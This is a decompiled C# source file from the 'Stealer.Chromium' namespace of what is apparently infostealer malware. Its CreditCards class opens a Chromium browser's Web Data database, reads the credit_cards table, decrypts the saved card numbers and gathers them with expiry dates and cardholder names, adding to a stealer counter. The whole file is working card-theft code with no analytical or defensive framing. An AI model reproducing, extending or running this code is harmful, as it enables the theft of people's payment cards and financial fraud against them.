using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000035 RID: 53
	internal sealed class CreditCards
	{
		// Token: 0x060000E5 RID: 229 RVA: 0x0000811C File Offset: 0x0000631C
		public static List<CreditCard> Get(string sWebData)
		{
			List<CreditCard> result;
			try
			{
				List<CreditCard> list = new List<CreditCard>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						CreditCard item = default(CreditCard);
						item.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
						item.sExpYear = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						item.sExpMonth = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Counter.CreditCards++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<CreditCard>();
			}
			return result;
		}
	}
}
